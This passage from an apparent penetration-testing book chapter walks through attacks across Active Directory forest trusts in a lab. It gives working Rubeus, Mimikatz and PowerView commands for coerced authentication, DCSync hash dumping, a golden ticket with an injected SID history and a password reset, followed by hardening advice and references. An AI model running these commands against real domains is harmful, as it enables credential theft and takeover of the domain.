<p>The next moving part is <strong class="bold">SID history</strong>. SID history is a property of a user<a id="_idIndexMarker427"/> or group that allows the keeping of an old SID during the migration from one domain to another in order to keep necessary access. SID history values can be filtered, depending on SID filtering behavior. Inter-forest trusts have different authentication levels available: <strong class="bold">forest-wide</strong>, <strong class="bold">domain-wide</strong>, and <strong class="bold">selective</strong>. Selective authentication is the strictest as it has a direct match between the subject and object. This is the bare minimum amount of theory required to understand how to move <span class="No-Break">across forests.</span></p>
<p>As a first step, we will enumerate trusts<a id="_idIndexMarker428"/> in the forests in the lab. Then, we will discuss common attack<a id="_idIndexMarker429"/> vectors and their limitations such as password reuse, foreign group member compromise, unconstrained delegation abuse between forests, and injection of an extra SID into the <span class="No-Break">SID history.</span></p>
<p>For trust enumeration, we have plenty of tools at our disposal, such as PowerView, BloodHound, or the Netdom utility. The following commands are available <span class="No-Break">in PowerView:</span></p>
<ul>
<li><span class="No-Break"><strong class="source-inline">Get-DomainTrust</strong></span></li>
<li><span class="No-Break"><strong class="source-inline">Get-ForestTrust</strong></span></li>
<li><span class="No-Break"><strong class="source-inline">Get-DomainTrustMapping</strong></span></li>
</ul>
<p>The result of the first command execution is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer132">
<img alt="Figure 5.41 – All trusts for the current user’s domain" height="279" src="image/B18964_05_41.jpg" width="446"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.41 – All trusts for the current user’s domain</p>
<p>We will start our discussion about attacking options in password reuse attacks. In a real environment, this attack is often successful. Dump users from the compromised forest, look for the same user accounts in the external forest, and then try password reuse <span class="No-Break">against them.</span></p>
<p>Next, we can enumerate<a id="_idIndexMarker430"/> foreign groups and users with the help of PowerView <a id="_idIndexMarker431"/>commands (<strong class="source-inline">Get-DomainForeignUser</strong> and <strong class="source-inline">Get-DomainForeignGroupMember</strong>) or by using the BloodHound query provided by <em class="italic">Mayfly</em> in <span class="No-Break">his walk-through:</span></p>
<pre class="console">
MATCH p = (a:Domain)-[:Contains*1..]-&gt;(x)--&gt;(w)--&gt;(z)&lt;--(y)&lt;-[:Contains*1..]-(b:Domain) where (x:Container or x:OU) and (y:Container or y:OU) and (a.name &lt;&gt;b.name) and (tolower(w.samaccountname) &lt;&gt; "enterprise admins" and tolower(w.samaccountname) &lt;&gt; "enterprise key admins" and tolower(z.samaccountname) &lt;&gt; "enterprise admins" and tolower(z.samaccountname) &lt;&gt; "enterprise key admins")  RETURN p</pre> <p>The following are users and groups that have access across domains <span class="No-Break">and forests:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer133">
<img alt="Figure 5.42 – Users and groups with cross-domain and forest rights" height="769" src="image/B18964_05_42.jpg" width="990"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.42 – Users and groups with cross-domain and forest rights</p>
<p>After we compromise the user with membership in a group such as <strong class="source-inline">SPYS</strong>, we can laterally move between forests and enjoy our <span class="No-Break">new privileges.</span></p>
<p>Another way to break forests’ trust is by abusing <strong class="bold">Kerberos unconstrained delegation</strong> (<strong class="bold">KUD</strong>) between the local machine with KUD<a id="_idIndexMarker432"/> enabled and the domain controller in the external forest by coercing authentication using PrinterBug or PetitPotam. However, it is possible only if TGT delegation<a id="_idIndexMarker433"/> is enabled, which was true by default<a id="_idIndexMarker434"/> till March 2019[18]. In our case, we replicate the attack with the help of Rubeus and PrinterBug to <span class="No-Break">force authentication:</span></p>
<pre class="console">
Rubeus.exe monitor /filteruser:MEEREEN$ /interval:1 /nowrap
spool.exe meereen.essos.local kingslanding.sevenkingdoms.local
Rubeus.exe ptt /ticket:"base64_ticket_from_capture"
Mimikatz.exe "lsadump::dcsync /all /csv /domain:essos.local"</pre> <p>As a result, we dumped all hashes from the <span class="No-Break"><strong class="source-inline">essos</strong></span><span class="No-Break"> forest:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer134">
<img alt="Figure 5.43 – Hashes of all domain objects from the essos forest" height="652" src="image/B18964_05_43.jpg" width="859"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.43 – Hashes of all domain objects from the essos forest</p>
<p>SID filtering<a id="_idIndexMarker435"/> can be in three states: <strong class="bold">disabled</strong>, <strong class="bold">relaxed</strong>, and <strong class="bold">enforced</strong>. If SID filtering is disabled, the attacker will be able to simply add the RID of the <strong class="source-inline">Enterprise Admins</strong> group and get access to the target domain controller for the <span class="No-Break"><strong class="source-inline">DCSync</strong></span><span class="No-Break"> attack.</span></p>
<p>With SID filtering fully<a id="_idIndexMarker436"/> enforced, the only possibility for lateral movement<a id="_idIndexMarker437"/> is to compromise domain users with privileges in the target forest or bypass SID filtering by <span class="No-Break">exploiting CVE-2020-0665.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Exploitation steps<a id="_idIndexMarker438"/> are well described <span class="No-Break">here: </span><a href="https://www.thehacker.recipes/ad/movement/trusts#cve-2020-0665"><span class="No-Break">https://www.thehacker.recipes/ad/movement/trusts#cve-2020-0665</span></a><span class="No-Break">.</span></p>
<p>If SID history is enabled, it means that SID filtering<a id="_idIndexMarker439"/> is relaxed (the <strong class="source-inline">TREAT_AS_EXTERNAL</strong> flag). In such a scenario, an attacker can spoof their membership in any group with <strong class="source-inline">RID &gt; 1000</strong>[19] by adding the group’s SID in the SID history<a id="_idIndexMarker440"/> attribute. In our example, we will enumerate groups in the <strong class="source-inline">essos.local</strong> forest with the help of PowerView looking for interesting groups with <strong class="source-inline">RID &gt; </strong><span class="No-Break"><strong class="source-inline">1000</strong></span><span class="No-Break">:</span></p>
<pre class="console">
Get-DomainGroup -Domain essos.local | select samaccountname, objectsid</pre> <p>As a result, we found several <span class="No-Break">promising candidates:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer135">
<img alt="Figure 5.44 – Domains groups in essos.local with RID &gt; 1000" height="60" src="image/B18964_05_44.jpg" width="470"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.44 – Domains groups in essos.local with RID &gt; 1000</p>
<p><strong class="source-inline">Spys</strong> has <strong class="source-inline">GenericAll</strong> on the <strong class="source-inline">jorah.mormont</strong> user, meaning<a id="_idIndexMarker441"/> we can take full control<a id="_idIndexMarker442"/> over <span class="No-Break">this user:</span></p>
<pre class="console">
mimikatz.exe "kerberos::golden /user:Administrator /domain:sevenkingdoms.local /sid:S-1-5-21-4243769114-3325725031-2403382846 /sids:S-1-5-21-2801885930-3847104905-347266793-1109 /rc4:f622cc44c550868e310fbf5ded4194f3 /service:krbtgt /target:essos.local /ticket:trust.kirbi"
Rubeus.exe asktgs /ticket:trust.kirbi /service:ldap/meereen.essos.local /dc:meereen.essos.local /ptt
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity jorah.mormont -domain essos.local -AccountPassword $UserPassword -Verbose</pre> <p>The password was changed successfully, as can be seen in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer136">
<img alt="Figure 5.45 – Successful password change" height="91" src="image/B18964_05_45.jpg" width="1389"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.45 – Successful password change</p>
<p>Verify that the new password was set successfully <span class="No-Break">with </span><span class="No-Break"><strong class="source-inline">crackmapexec</strong></span><span class="No-Break">:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer137">
<img alt="Figure 5.46 – Successful login with the new password" height="117" src="image/B18964_05_46.jpg" width="962"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.46 – Successful login with the new password</p>
<p>To prevent inter-forest abuse, ensure that strict SID filtering<a id="_idIndexMarker443"/> is enforced, TGT delegation and SID history<a id="_idIndexMarker444"/> are disabled, and ACLs are correctly applied to objects in the forest. However, if the attacker<a id="_idIndexMarker445"/> was able to compromise or impersonate a user<a id="_idIndexMarker446"/> with a foreign group membership, only selective authentication can limit <span class="No-Break">the damage.</span></p>
<h1 id="_idParaDest-107"><a id="_idTextAnchor115"/>Summary</h1>
<p>This chapter has covered the topic of lateral movement. We discussed how administrative protocols can be used for movement across the environment. It is an effective way to blend in with normal traffic and fly under the radar. The concept of relaying the hash is a powerful weapon in environments lacking hardening. Simple recommendations such as disabling unused protocols and services can significantly improve security posture. It is important to mention that, in complex environments, even simple changes can create chaos and outages, and thorough testing is required. A deep dive into Kerberos authentication, different delegation types, and ways to abuse them helped to understand in more detail the complexity of the Kerberos protocol itself and the security implications of each delegation type. We have demonstrated in practice that for successful lateral movement, attackers do not necessarily need the victim’s password. It can be any form of credential material, such as a hash, ticket, or key. Staying stealthy and mimicking real authentication attempts require an in-depth understanding of your tradecraft. In <a href="B18964_08.xhtml#_idTextAnchor163"><span class="No-Break"><em class="italic">Chapter 8</em></span></a>, we will demonstrate that certificates can also be used for lateral movement. Last but not least, lateral movement between forests shows that it is not only about how secure you are but also who your trustees are. In the next chapter, we will discuss privilege escalation inside <span class="No-Break">the domain.</span></p>
<h1 id="_idParaDest-108"><a id="_idTextAnchor116"/>References</h1>
<ol>
<li><span class="No-Break">Evil-WinRM: </span><a href="https://github.com/Hackplayers/evil-winrm"><span class="No-Break">https://github.com/Hackplayers/evil-winrm</span></a></li>
<li>Set up JEA in the <span class="No-Break">lab: </span><a href="https://cheats.philkeeble.com/active-directory/ad-privilege-escalation/jea"><span class="No-Break">https://cheats.philkeeble.com/active-directory/ad-privilege-escalation/jea</span></a></li>
<li>RACE <span class="No-Break">toolkit: </span><a href="https://github.com/samratashok/RACE"><span class="No-Break">https://github.com/samratashok/RACE</span></a></li>
<li>User Rights Assignment: RDP - <a href="https://blog.cptjesus.com/posts/userrightsassignment/"><span class="No-Break">https://blog.cptjesus.com/posts/userrightsassignment/</span></a></li>
<li><span class="No-Break">RestrictedAdmin: </span><a href="https://github.com/GhostPack/RestrictedAdmin"><span class="No-Break">https://github.com/GhostPack/RestrictedAdmin</span></a></li>
<li><span class="No-Break">SharpRDP: </span><a href="https://github.com/0xthirteen/SharpRDP"><span class="No-Break">https://github.com/0xthirteen/SharpRDP</span></a></li>
<li><span class="No-Break">SharpRDPThief: </span><a href="https://github.com/passthehashbrowns/SharpRDPThief"><span class="No-Break">https://github.com/passthehashbrowns/SharpRDPThief</span></a></li>
<li><span class="No-Break">Impacket: </span><a href="https://github.com/fortra/impacket"><span class="No-Break">https://github.com/fortra/impacket</span></a></li>
<li>CVE-2019-1019 <span class="No-Break">writeup: </span><a href="https://securityboulevard.com/2019/06/your-session-key-is-my-session-key-how-to-retrieve-the-session-key-for-any-authentication/"><span class="No-Break">https://securityboulevard.com/2019/06/your-session-key-is-my-session-key-how-to-retrieve-the-session-key-for-any-authentication/</span></a></li>
<li><span class="No-Break">Dementor: </span><a href="https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py"><span class="No-Break">https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py</span></a></li>
<li>Drop-the-MIC <span class="No-Break">scanner: </span><a href="https://github.com/fox-it/cve-2019-1040-scanner"><span class="No-Break">https://github.com/fox-it/cve-2019-1040-scanner</span></a></li>
<li>Checking the username of logged-in users to the Kerberos <span class="No-Break">tickets: </span><a href="https://gist.github.com/JoeDibley/fd93a9c5b3d45dbd8cbfdd003ddc1bd1"><span class="No-Break">https://gist.github.com/JoeDibley/fd93a9c5b3d45dbd8cbfdd003ddc1bd1</span></a></li>
<li><span class="No-Break">StandIn: </span><a href="https://github.com/FuzzySecurity/StandIn"><span class="No-Break">https://github.com/FuzzySecurity/StandIn</span></a></li>
<li><span class="No-Break">Powermad: </span><a href="https://github.com/Kevin-Robertson/Powermad"><span class="No-Break">https://github.com/Kevin-Robertson/Powermad</span></a></li>
<li>Exploiting RBCD as a normal <span class="No-Break">user: </span><a href="https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.xhtml"><span class="No-Break">https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.xhtml</span></a></li>
<li>Abuse of constrained delegation from <span class="No-Break">Linux: </span><a href="https://mayfly277.github.io/posts/GOADv2-pwning-part10/#without-protocol-transition"><span class="No-Break">https://mayfly277.github.io/posts/GOADv2-pwning-part10/#without-protocol-transition</span></a></li>
<li>Bypass SID <span class="No-Break">filtering: </span><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research"><span class="No-Break">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research</span></a></li>
<li>Updates to TGT delegation across incoming trusts in Windows <span class="No-Break">Server: </span><a href="https://support.microsoft.com/en-us/topic/updates-to-tgt-delegation-across-incoming-trusts-in-windows-server-1a6632ac-1599-0a7c-550a-a754796c291e"><span class="No-Break">https://support.microsoft.com/e<span id="_idTextAnchor117"/>n-us/topic/updates-to-tgt-delegation-across-incoming-trusts-in-windows-server-1a6632ac-1599-0a7c-550a-a754796c291e</span></a></li>
<li>Abuse SID <span class="No-Break">history: </span><a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/"><span class="No-Break">https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/</span></a></li>
</ol>
<h1 id="_idParaDest-109"><a id="_idTextAnchor118"/>Further reading</h1>
<p>These aids for further study will let you dive deeper into the attacks covered in <span class="No-Break">the chapter:</span></p>
<ul>
<li>The original research behind the SharpRDP tool <span class="No-Break">creation: </span><a href="https://0xthirteen.com/2020/01/21/revisiting-remote-desktop-lateral-movement/"><span class="No-Break">https://0xthirteen.com/2020/01/21/revisiting-remote-desktop-lateral-movement/</span></a></li>
<li>Dumping RDP credentials with the help of <span class="No-Break">Mimikatz: </span><a href="https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/"><span class="No-Break">https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/</span></a></li>
<li>Microsoft documentation about Remote Credential <span class="No-Break">Guard: </span><a href="https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard"><span class="No-Break">https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard</span></a></li>
<li>Great research published by <em class="italic">0xf0x</em> about Impacket usage and <span class="No-Break">detection: </span><a href="https://neil-fox.github.io/Impacket-usage-&amp;-detection/"><span class="No-Break">https://neil-fox.github.io/Impacket-usage-&amp;-detection/</span></a></li>
<li>Detailed publication about artifacts left by running remote command <span class="No-Break">execution: </span><a href="https://www.synacktiv.com/publications/traces-of-windows-remote-command-execution.xhtml"><span class="No-Break">https://www.synacktiv.com/publications/traces-of-windows-remote-command-execution.xhtml</span></a></li>
<li>More information about ASR <span class="No-Break">implementation: </span><a href="https://www.joeyverlinden.com/implementing-and-monitoring-attack-surface-reduction-rules-asr/"><span class="No-Break">https://www.joeyverlinden.com/implementing-and-monitoring-attack-surface-reduction-rules-asr/</span></a></li>
<li>Great theory background about NTLM relay attack and <span class="No-Break">conditions: </span><a href="https://www.thehacker.recipes/ad/movement/ntlm/relay"><span class="No-Break">https://www.thehacker.recipes/ad/movement/ntlm/relay</span></a></li>
<li>Detailed blog post about differences between versions of the NTLM <span class="No-Break">protocol: </span><a href="https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/"><span class="No-Break">https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/</span></a></li>
<li>Detecting Pass-the-Hash <span class="No-Break">attacks: </span><a href="https://blog.netwrix.com/2021/11/30/how-to-detect-pass-the-hash-attacks/"><span class="No-Break">https://blog.netwrix.com/2021/11/30/how-to-detect-pass-the-hash-attacks/</span></a></li>
<li>Unconstrained <span class="No-Break">delegation: </span><a href="https://en.hackndo.com/constrained-unconstrained-delegation/#unconstrained-delegation"><span class="No-Break">https://en.hackndo.com/constrained-unconstrained-delegation/#unconstrained-delegation</span></a></li>
<li>The list of LDAP syntax <span class="No-Break">filters: </span><a href="https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx"><span class="No-Break">https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx</span></a></li>
<li>Example of RBCD attack <span class="No-Break">execution: </span><a href="https://pentestlab.blog/2021/10/18/resource-based-constrained-delegation/"><span class="No-Break">https://pentestlab.blog/2021/10/18/resource-based-constrained-delegation/</span></a></li>
<li>Great explanation of the constrained delegation abuse with schemas and traffic <span class="No-Break">capture: </span><a href="https://www.notsoshant.io/blog/attacking-kerberos-constrained-delegation/"><span class="No-Break">https://www.notsoshant.io/blog/attacking-kerberos-constrained-delegation/</span></a></li>
<li>Bronze Bit vulnerability and theory behind <span class="No-Break">it: </span><a href="https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/"><span class="No-Break">https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/</span></a></li>
</ul>
</div>
</div></body></html>